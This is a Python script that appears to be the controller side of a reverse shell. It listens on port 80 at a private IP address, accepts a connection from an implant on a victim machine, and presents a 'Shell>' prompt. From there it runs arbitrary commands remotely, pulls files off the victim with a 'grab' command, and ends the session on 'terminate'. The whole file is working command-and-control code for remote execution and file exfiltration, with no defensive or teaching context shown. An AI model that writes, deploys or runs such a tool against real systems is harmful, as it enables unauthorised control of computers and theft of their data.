import socket
import sys

HOST = "172.16.42.137"
PORT = 80

def transfer(connection, command):
    connection.send(command)

    with open('file.data', 'wb') as f:
        print('[+] File transfer started')
        while True:
            try:
                data = connection.recv(1024)
                if b'File not found' in data:
                    print('[-] File not found')
                    return

                if data.endswith(b'DONE'):
                    print('[+] File grabbed successfully.')
                    break
                
                f.write(data)
            except Exception as e:
                print(f'[-] Failed to grab file {str(e)}')
                return
    print('[+] File transfer completed')

def execute_command(conn, command):
    try:
        conn.send(command.encode())
        print(conn.recv(4096).decode())
    except BrokenPipeError as bre:
        print('[-] Client disconnected')
        exit(1)
    except ConnectionResetError as cre:
        print('[-] Client disconnected')
        exit(1)
    except KeyboardInterrupt as kre:
        print('\n[+] Exiting ...')
        exit()
    except Exception as e:
        print(f'[-] Something went wrong {str(e)}')

def listen():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    s.bind((HOST, PORT))
    s.listen(20)

    print(f'[+] Listening on port: {PORT}')
    conn, addr = s.accept()

    print(f'[+] Client connected: {addr}')

    while True:
        try:
            command = input('Shell> ')
        except KeyboardInterrupt as ke:
            print('\n[+] Exiting ...')
            exit(0)
        
        if 'terminate' in command:
            conn.send('terminate'.encode())
            print('[+] Connection closed')
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command.encode())
        else:
            execute_command(conn, command)
    
def main():
    listen()

if __name__ == "__main__":
    main()